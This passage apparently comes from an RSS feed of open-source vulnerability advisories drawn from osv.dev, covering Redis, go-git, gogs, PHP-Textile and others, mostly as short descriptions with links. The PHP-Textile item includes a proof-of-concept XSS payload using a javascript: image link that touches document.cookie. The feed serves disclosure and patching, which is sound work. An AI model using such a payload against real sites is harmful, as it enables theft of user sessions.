                    <title>BIT-keydb-2024-46981: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-keydb-2024-46981</link>
                    <pubDate>2025-01-08T07:13:21.212Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-keydb-2024-46981'>https://osv.dev/vulnerability/BIT-keydb-2024-46981</a><br>
                            <b>Published:</b> 2025-01-08T07:13:21.212Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/redis/redis/releases/tag/6.2.17'>https://github.com/redis/redis/releases/tag/6.2.17</a></li><li>- <a target='_blank' href='https://github.com/redis/redis/releases/tag/7.2.7'>https://github.com/redis/redis/releases/tag/7.2.7</a></li><li>- <a target='_blank' href='https://github.com/redis/redis/releases/tag/7.4.2'>https://github.com/redis/redis/releases/tag/7.4.2</a></li><li>- <a target='_blank' href='https://github.com/redis/redis/security/advisories/GHSA-39h2-x6c4-6w4c'>https://github.com/redis/redis/security/advisories/GHSA-39h2-x6c4-6w4c</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2025/01/msg00018.html'>https://lists.debian.org/debian-lts-announce/2025/01/msg00018.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Redis is an open source, in-memory database that persists on disk. An authenticated user may use a specially crafted Lua script to manipulate the garbage collector and potentially lead to remote code execution. The problem is fixed in 7.4.2, 7.2.7, and 6.2.17. An additional workaround to mitigate the problem without patching the redis-server executable is to prevent users from executing Lua scripts. This can be done using ACL to restrict EVAL and EVALSHA commands.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-keydb-2024-51741: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-keydb-2024-51741</link>
                    <pubDate>2025-01-08T07:13:13.917Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-keydb-2024-51741'>https://osv.dev/vulnerability/BIT-keydb-2024-51741</a><br>
                            <b>Published:</b> 2025-01-08T07:13:13.917Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/redis/redis/security/advisories/GHSA-prpq-rh5h-46g9'>https://github.com/redis/redis/security/advisories/GHSA-prpq-rh5h-46g9</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Redis is an open source, in-memory database that persists on disk. An authenticated with sufficient privileges may create a malformed ACL selector which, when accessed, triggers a server panic and subsequent denial of service. The problem is fixed in Redis 7.2.7 and 7.4.2.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-54731: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-54731</link>
                    <pubDate>2025-01-08T05:15:11Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-54731'>https://osv.dev/vulnerability/CVE-2024-54731</a><br>
                            <b>Published:</b> 2025-01-08T05:15:11Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/johnwhitington/cpdf-source/issues/366'>https://github.com/johnwhitington/cpdf-source/issues/366</a></li></ul><br>
                            <b>Details:</b> <b></b><br>cpdf through 2.8 allows stack consumption via a crafted PDF document.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-17: 0 | <b>Heap-buffer-overflow in cv::PngDecoder::readHeader</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-17</link>
                    <pubDate>2025-01-08T00:14:02.009521Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-17'>https://osv.dev/vulnerability/OSV-2025-17</a><br>
                            <b>Published:</b> 2025-01-08T00:14:02.009521Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=387626408'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=387626408</a></li></ul><br>
                            <b>Details:</b> <b>Heap-buffer-overflow in cv::PngDecoder::readHeader</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=387626408

```
Crash type: Heap-buffer-overflow READ 2
Crash state:
cv::PngDecoder::readHeader
cv::imdecode_
cv::imdecode
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-16: 0 | <b>UNKNOWN READ in png_free_data</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-16</link>
                    <pubDate>2025-01-08T00:13:45.160139Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-16'>https://osv.dev/vulnerability/OSV-2025-16</a><br>
                            <b>Published:</b> 2025-01-08T00:13:45.160139Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=386860184'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=386860184</a></li></ul><br>
                            <b>Details:</b> <b>UNKNOWN READ in png_free_data</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=386860184

```
Crash type: UNKNOWN READ
Crash state:
png_free_data
png_destroy_info_struct
png_destroy_read_struct
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2022-41572: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2022-41572</link>
                    <pubDate>2025-01-07T20:15:27Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2022-41572'>https://osv.dev/vulnerability/CVE-2022-41572</a><br>
                            <b>Published:</b> 2025-01-07T20:15:27Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/EyesOfNetworkCommunity/eonweb/issues/120'>https://github.com/EyesOfNetworkCommunity/eonweb/issues/120</a></li><li>- <a target='_blank' href='https://github.com/Orange-Cyberdefense/CVE-repository/'>https://github.com/Orange-Cyberdefense/CVE-repository/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in EyesOfNetwork (EON) through 5.3.11. Privilege escalation can be accomplished on the server because nmap can be run as root. The attacker achieves total control over the server.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-95m2-chm4-mq7m: 7.3 | <b>PHP-Textile has persistent XSS vulnerability in image link handling</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-95m2-chm4-mq7m</link>
                    <pubDate>2025-01-07T17:11:02Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-95m2-chm4-mq7m'>https://osv.dev/vulnerability/GHSA-95m2-chm4-mq7m</a><br>
                            <b>Published:</b> 2025-01-07T17:11:02Z<br>
                            <b>Severity:</b> 7.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/textile/php-textile/security/advisories/GHSA-95m2-chm4-mq7m'>https://github.com/textile/php-textile/security/advisories/GHSA-95m2-chm4-mq7m</a></li><li>- <a target='_blank' href='https://github.com/textile/php-textile/commit/ab18ae9703bee8b15f1b9d889d40e1881728bae6'>https://github.com/textile/php-textile/commit/ab18ae9703bee8b15f1b9d889d40e1881728bae6</a></li><li>- <a target='_blank' href='https://github.com/textile/php-textile'>https://github.com/textile/php-textile</a></li></ul><br>
                            <b>Details:</b> <b>PHP-Textile has persistent XSS vulnerability in image link handling</b><br>### Details

Persistent XSS vulnerability in image link handling of PHP-Textile versions 4.1.2 and older, when running the parser in restricted mode. In restricted mode it is expected that the input would be sanitized, allowing user-input (such as user comments) to be parsed and handled safely by the PHP-Textile library.

In restricted mode, the version 4.1.2 of the library does not sanitize or validate user-controllable href input in image links, but allows any link protocol or JavaScriptt links to be used. The vulnerability allows an attacker to add malicious JavaScript code to the page which is then executed when an unexpecting user clicks the link.

In non-restricted mode, the library allows mixed HTML input, and any link protocol by design. In restricted mode, text links were already handled correctly and the vulnerability only affects image links.

### Resolution

This issue was fixed in PHP-Textile version 4.1.3. Version 4.1.3 disallows use of JavaScript in image links when the parser is ran in restricted mode. Restricted mode can be enabled with `Parser::setRestricted()` method prior to calling the `parse` method. For more information, see **Parsing unstructed input** in the project&#x27;s [README](https:&#x2F;&#x2F;github.com&#x2F;textile&#x2F;php-textile?tab=readme-ov-file#parsing-untrusted-input).

### PoC

The following Textile input:

```
!securing.pl(Click Tu)!:javascript:document.innerHTML=&#x27;&amp;lt;script&amp;gt;alert(1);&amp;lt;&#x2F;script&amp;gt;&#x27;+document.cookie)
```

Would render as the following HTML even in restricted mode:

`&amp;lt;p&amp;gt;&amp;lt;a href=&quot;javascript:document.innerHTML=&amp;#39;&amp;lt;script&amp;gt;alert(1);&amp;lt;&#x2F;script&amp;gt;&amp;#39;+document.cookie&quot;&amp;gt;&amp;lt;img alt=&quot;Click Tu&quot; src=&quot;securing.pl&quot; title=&quot;Click Tu&quot;&amp;gt;&amp;lt;&#x2F;a&amp;gt;)&amp;lt;&#x2F;p&amp;gt;`

### Impact

The attacker can perform any operation in the application with user’s privileges or remotely control user’s browser with automated tools.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2024-3355: 0 | Remote Command Execution in file editing in gogs in gogs.io&#x2F;gogs</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2024-3355</link>
                    <pubDate>2025-01-07T16:03:18Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2024-3355'>https://osv.dev/vulnerability/GO-2024-3355</a><br>
                            <b>Published:</b> 2025-01-07T16:03:18Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gogs/gogs/commit/c94baec9ca923f38c19f0c7c5af722b9ec04022a'>https://github.com/gogs/gogs/commit/c94baec9ca923f38c19f0c7c5af722b9ec04022a</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/issues/7582'>https://github.com/gogs/gogs/issues/7582</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/pull/7857'>https://github.com/gogs/gogs/pull/7857</a></li></ul><br>
                            <b>Details:</b> Remote Command Execution in file editing in gogs in gogs.io&#x2F;gogs
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2024-3356: 0 | Path Traversal in file update API in gogs in gogs.io&#x2F;gogs</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2024-3356</link>
                    <pubDate>2025-01-07T16:03:18Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2024-3356'>https://osv.dev/vulnerability/GO-2024-3356</a><br>
                            <b>Published:</b> 2025-01-07T16:03:18Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gogs/gogs/commit/9a9388ace25bd646f5098cb9193d983332c34e41'>https://github.com/gogs/gogs/commit/9a9388ace25bd646f5098cb9193d983332c34e41</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/issues/7582'>https://github.com/gogs/gogs/issues/7582</a></li><li>- <a target='_blank' href='https://github.com/gogs/gogs/pull/7859'>https://github.com/gogs/gogs/pull/7859</a></li></ul><br>
                            <b>Details:</b> Path Traversal in file update API in gogs in gogs.io&#x2F;gogs
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2024-3359: 0 | GoCast OS Command Injection vulnerability in github.com&#x2F;mayuresh82&#x2F;gocast</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2024-3359</link>
                    <pubDate>2025-01-07T16:03:18Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2024-3359'>https://osv.dev/vulnerability/GO-2024-3359</a><br>
                            <b>Published:</b> 2025-01-07T16:03:18Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://talosintelligence.com/vulnerability_reports/TALOS-2024-1960'>https://talosintelligence.com/vulnerability_reports/TALOS-2024-1960</a></li><li>- <a target='_blank' href='https://www.talosintelligence.com/vulnerability_reports/TALOS-2024-1960'>https://www.talosintelligence.com/vulnerability_reports/TALOS-2024-1960</a></li></ul><br>
                            <b>Details:</b> GoCast OS Command Injection vulnerability in github.com&#x2F;mayuresh82&#x2F;gocast
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3361: 0 | GoPhish sends cleartext passwords in github.com&#x2F;gophish&#x2F;gophish</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3361</link>
                    <pubDate>2025-01-07T16:03:18Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3361'>https://osv.dev/vulnerability/GO-2025-3361</a><br>
                            <b>Published:</b> 2025-01-07T16:03:18Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/hexkaster/SecurityResearch/blob/main/CVE-2024-55196.md'>https://github.com/hexkaster/SecurityResearch/blob/main/CVE-2024-55196.md</a></li></ul><br>
                            <b>Details:</b> GoPhish sends cleartext passwords in github.com&#x2F;gophish&#x2F;gophish
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2r2v-9pf8-6342: 0 | <b>WireGuard Portal v2 Vulnerable to OAuth Insecure Redirect URI &#x2F; Account Takeover</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2r2v-9pf8-6342</link>
                    <pubDate>2025-01-07T15:52:16Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2r2v-9pf8-6342'>https://osv.dev/vulnerability/GHSA-2r2v-9pf8-6342</a><br>
                            <b>Published:</b> 2025-01-07T15:52:16Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/h44z/wg-portal/security/advisories/GHSA-2r2v-9pf8-6342'>https://github.com/h44z/wg-portal/security/advisories/GHSA-2r2v-9pf8-6342</a></li><li>- <a target='_blank' href='https://github.com/h44z/wg-portal/commit/62dbdfe0f96045d46e121d509fc181fbb7936895'>https://github.com/h44z/wg-portal/commit/62dbdfe0f96045d46e121d509fc181fbb7936895</a></li><li>- <a target='_blank' href='https://github.com/h44z/wg-portal'>https://github.com/h44z/wg-portal</a></li></ul><br>
                            <b>Details:</b> <b>WireGuard Portal v2 Vulnerable to OAuth Insecure Redirect URI &#x2F; Account Takeover</b><br>### Impact
Users of WireGuard Portal v2 who have OAuth (or OIDC) authentication backends enabled can be affected by an Account Takeover vulnerability if they visit a malicious website.

### Patches
The problem was fixed in the latest alpha release, v2.0.0-alpha.3. The [docker images](https:&#x2F;&#x2F;hub.docker.com&#x2F;r&#x2F;wgportal&#x2F;wg-portal) for the tag &#x27;latest&#x27; built from the master branch also include the fix.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-7: 0 | <b>Heap-buffer-overflow in oatpp::json::Utils::escapeUtf8Char</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-7</link>
                    <pubDate>2025-01-07T00:03:42.053605Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-7'>https://osv.dev/vulnerability/OSV-2025-7</a><br>
                            <b>Published:</b> 2025-01-07T00:03:42.053605Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=387626404'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=387626404</a></li></ul><br>
                            <b>Details:</b> <b>Heap-buffer-overflow in oatpp::json::Utils::escapeUtf8Char</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=387626404

```
Crash type: Heap-buffer-overflow WRITE 1
Crash state:
oatpp::json::Utils::escapeUtf8Char
oatpp::json::Utils::escapeString
oatpp::json::Serializer::serializeString
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-m78c-qx99-mvw9: 2.0 | <b>Grav Cross-site Scripting vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-m78c-qx99-mvw9</link>
                    <pubDate>2025-01-06T21:30:51Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-m78c-qx99-mvw9'>https://osv.dev/vulnerability/GHSA-m78c-qx99-mvw9</a><br>
                            <b>Published:</b> 2025-01-06T21:30:51Z<br>
                            <b>Severity:</b> 2.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/getgrav/grav'>https://github.com/getgrav/grav</a></li><li>- <a target='_blank' href='https://github.com/r4vanan/Stored-xss-Grav-v1.7.45'>https://github.com/r4vanan/Stored-xss-Grav-v1.7.45</a></li><li>- <a target='_blank' href='https://r4vanan.medium.com/a-quick-dive-into-xss-vulnerability-in-grav-cms-v1-7-45-cve-2024-35498-fc236b7d74a0'>https://r4vanan.medium.com/a-quick-dive-into-xss-vulnerability-in-grav-cms-v1-7-45-cve-2024-35498-fc236b7d74a0</a></li></ul><br>
                            <b>Details:</b> <b>Grav Cross-site Scripting vulnerability</b><br>A cross-site scripting (XSS) vulnerability in Grav v1.7.45 allows attackers to execute arbitrary web scripts or HTML via a crafted payload.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2p95-8xvm-2pjx: 1.9 | <b>REDAXO CMS Cross-site Scripting vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2p95-8xvm-2pjx</link>
                    <pubDate>2025-01-06T21:30:51Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2p95-8xvm-2pjx'>https://osv.dev/vulnerability/GHSA-2p95-8xvm-2pjx</a><br>
                            <b>Published:</b> 2025-01-06T21:30:51Z<br>
                            <b>Severity:</b> 1.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/h4ckr4v3n/CVE-2024-46209/blob/main/REDAXO%20Stored%20XSS%20%2B%20RCE.pdf'>https://github.com/h4ckr4v3n/CVE-2024-46209/blob/main/REDAXO%20Stored%20XSS%20%2B%20RCE.pdf</a></li><li>- <a target='_blank' href='https://github.com/h4ckr4v3n/research_redaxo_5_17_1.git'>https://github.com/h4ckr4v3n/research_redaxo_5_17_1.git</a></li><li>- <a target='_blank' href='https://github.com/redaxo/redaxo'>https://github.com/redaxo/redaxo</a></li></ul><br>
                            <b>Details:</b> <b>REDAXO CMS Cross-site Scripting vulnerability</b><br>A stored cross-site scripting (XSS) vulnerability in the component &#x2F;media&#x2F;test.html of REDAXO CMS v5.17.1 allows attackers to execute arbitrary web scripts or HTML via injecting a crafted payload into the password parameter.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-21617: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-21617</link>
                    <pubDate>2025-01-06T20:15:39Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-21617'>https://osv.dev/vulnerability/CVE-2025-21617</a><br>
                            <b>Published:</b> 2025-01-06T20:15:39Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> php<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/guzzle/oauth-subscriber/blob/0.8.0/src/Oauth1.php#L192'>https://github.com/guzzle/oauth-subscriber/blob/0.8.0/src/Oauth1.php#L192</a></li><li>- <a target='_blank' href='https://github.com/guzzle/oauth-subscriber/releases/tag/0.8.1'>https://github.com/guzzle/oauth-subscriber/releases/tag/0.8.1</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Guzzle OAuth Subscriber signs Guzzle requests using OAuth 1.0. Prior to 0.8.1, Nonce generation does not use sufficient entropy nor a cryptographically secure pseudorandom source. This can leave servers vulnerable to replay attacks when TLS is not used. This vulnerability is fixed in 0.8.1.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-237r-r8m4-4q88: 6.3 | <b>Guzzle OAuth Subscriber has insufficient nonce entropy</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-237r-r8m4-4q88</link>
                    <pubDate>2025-01-06T19:23:26Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-237r-r8m4-4q88'>https://osv.dev/vulnerability/GHSA-237r-r8m4-4q88</a><br>
                            <b>Published:</b> 2025-01-06T19:23:26Z<br>
                            <b>Severity:</b> 6.3<br>
                            <b>Langs:</b> php<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/guzzle/oauth-subscriber/security/advisories/GHSA-237r-r8m4-4q88'>https://github.com/guzzle/oauth-subscriber/security/advisories/GHSA-237r-r8m4-4q88</a></li><li>- <a target='_blank' href='https://github.com/guzzle/oauth-subscriber/commit/92b619b03bd21396e51c62e6bce83467d2ce8f53'>https://github.com/guzzle/oauth-subscriber/commit/92b619b03bd21396e51c62e6bce83467d2ce8f53</a></li><li>- <a target='_blank' href='https://github.com/guzzle/oauth-subscriber'>https://github.com/guzzle/oauth-subscriber</a></li><li>- <a target='_blank' href='https://github.com/guzzle/oauth-subscriber/blob/0.8.0/src/Oauth1.php#L192'>https://github.com/guzzle/oauth-subscriber/blob/0.8.0/src/Oauth1.php#L192</a></li><li>- <a target='_blank' href='https://github.com/guzzle/oauth-subscriber/releases/tag/0.8.1'>https://github.com/guzzle/oauth-subscriber/releases/tag/0.8.1</a></li></ul><br>
                            <b>Details:</b> <b>Guzzle OAuth Subscriber has insufficient nonce entropy</b><br>### Impact

Nonce generation does not use sufficient entropy nor a cryptographically secure pseudorandom source (https:&#x2F;&#x2F;github.com&#x2F;guzzle&#x2F;oauth-subscriber&#x2F;blob&#x2F;0.8.0&#x2F;src&#x2F;Oauth1.php#L192). This can leave servers vulnerable to replay attacks when TLS is not used.

### Patches

Upgrade to version 0.8.1 or higher.

### Workarounds

No.

### References

Issue is similar to https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2025-22376.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-v6jv-p6r8-j78w: 7.5 | <b>NiceGUI On Air authentication issue</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-v6jv-p6r8-j78w</link>
                    <pubDate>2025-01-06T16:31:16Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-v6jv-p6r8-j78w'>https://osv.dev/vulnerability/GHSA-v6jv-p6r8-j78w</a><br>
                            <b>Published:</b> 2025-01-06T16:31:16Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/zauberzeug/nicegui/security/advisories/GHSA-v6jv-p6r8-j78w'>https://github.com/zauberzeug/nicegui/security/advisories/GHSA-v6jv-p6r8-j78w</a></li><li>- <a target='_blank' href='https://github.com/zauberzeug/nicegui/commit/1621a4ba6a06676b8094362d36623551e651adc1'>https://github.com/zauberzeug/nicegui/commit/1621a4ba6a06676b8094362d36623551e651adc1</a></li><li>- <a target='_blank' href='https://github.com/zauberzeug/nicegui'>https://github.com/zauberzeug/nicegui</a></li></ul><br>
                            <b>Details:</b> <b>NiceGUI On Air authentication issue</b><br>### Summary
Once a user logins to one browser, all other browsers are logged in without entering password. Even incognito mode.

### Impact
high
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-r9px-m959-cxf4: 7.5 | <b>go-git clients vulnerable to DoS via maliciously crafted Git server replies</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-r9px-m959-cxf4</link>
                    <pubDate>2025-01-06T16:20:28Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-r9px-m959-cxf4'>https://osv.dev/vulnerability/GHSA-r9px-m959-cxf4</a><br>
                            <b>Published:</b> 2025-01-06T16:20:28Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/go-git/go-git/security/advisories/GHSA-r9px-m959-cxf4'>https://github.com/go-git/go-git/security/advisories/GHSA-r9px-m959-cxf4</a></li><li>- <a target='_blank' href='https://github.com/go-git/go-git'>https://github.com/go-git/go-git</a></li></ul><br>
                            <b>Details:</b> <b>go-git clients vulnerable to DoS via maliciously crafted Git server replies</b><br>### Impact
A denial of service (DoS) vulnerability was discovered in go-git versions prior to `v5.13`. This vulnerability allows an attacker to perform denial of service attacks by providing specially crafted responses from a Git server which triggers resource exhaustion in `go-git` clients. 

This is a `go-git` implementation issue and does not affect the upstream `git` cli.

### Patches
Users running versions of `go-git` from `v4` and above are recommended to upgrade to `v5.13` in order to mitigate this vulnerability.

### Workarounds
In cases where a bump to the latest version of `go-git` is not possible, we recommend limiting its use to only trust-worthy Git servers.

## Credit
Thanks to Ionut Lalu for responsibly disclosing this vulnerability to us.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-v725-9546-7q7m: 9.8 | <b>go-git has an Argument Injection via the URL field</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-v725-9546-7q7m</link>
                    <pubDate>2025-01-06T16:16:30Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-v725-9546-7q7m'>https://osv.dev/vulnerability/GHSA-v725-9546-7q7m</a><br>
                            <b>Published:</b> 2025-01-06T16:16:30Z<br>
                            <b>Severity:</b> 9.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/go-git/go-git/security/advisories/GHSA-v725-9546-7q7m'>https://github.com/go-git/go-git/security/advisories/GHSA-v725-9546-7q7m</a></li><li>- <a target='_blank' href='https://github.com/go-git/go-git'>https://github.com/go-git/go-git</a></li></ul><br>
                            <b>Details:</b> <b>go-git has an Argument Injection via the URL field</b><br>### Impact
An argument injection vulnerability was discovered in `go-git` versions prior to `v5.13`. 

Successful exploitation of this vulnerability could allow an attacker to set arbitrary values to [git-upload-pack flags](https:&#x2F;&#x2F;git-scm.com&#x2F;docs&#x2F;git-upload-pack). This only happens when the `file` transport protocol is being used, as that is the only protocol that shells out to `git` binaries.

### Affected versions
Users running versions of `go-git` from `v4` and above are recommended to upgrade to `v5.13` in order to mitigate this vulnerability.

### Workarounds
In cases where a bump to the latest version of `go-git` is not possible, we recommend users to enforce restrict validation rules for values passed in the URL field.

## Credit
Thanks to @vin01 for responsibly disclosing this vulnerability to us.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-21611: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-21611</link>
                    <pubDate>2025-01-06T16:15:31Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-21611'>https://osv.dev/vulnerability/CVE-2025-21611</a><br>
                            <b>Published:</b> 2025-01-06T16:15:31Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/tgstation/tgstation-server/issues/2064'>https://github.com/tgstation/tgstation-server/issues/2064</a></li></ul><br>
                            <b>Details:</b> <b></b><br>tgstation-server is a production scale tool for BYOND server management. Prior to 6.12.3, roles used to authorize API methods were incorrectly OR&#x27;d instead of AND&#x27;ed with the role used to determine if a user was enabled. This allows enabled users access to most, but not all, authorized actions regardless of their permissions. Notably, the WriteUsers right is unaffected so users may not use this bug to permanently elevate their account permissions. The fix is release in tgstation-server-v6.12.3.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-4x6x-8rm8-c37j: 8.6 | <b>Extension:TabberNeue vulnerable to Cross-site Scripting</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-4x6x-8rm8-c37j</link>
                    <pubDate>2025-01-06T15:47:49Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-4x6x-8rm8-c37j'>https://osv.dev/vulnerability/GHSA-4x6x-8rm8-c37j</a><br>
                            <b>Published:</b> 2025-01-06T15:47:49Z<br>
                            <b>Severity:</b> 8.6<br>
                            <b>Langs:</b> <br>
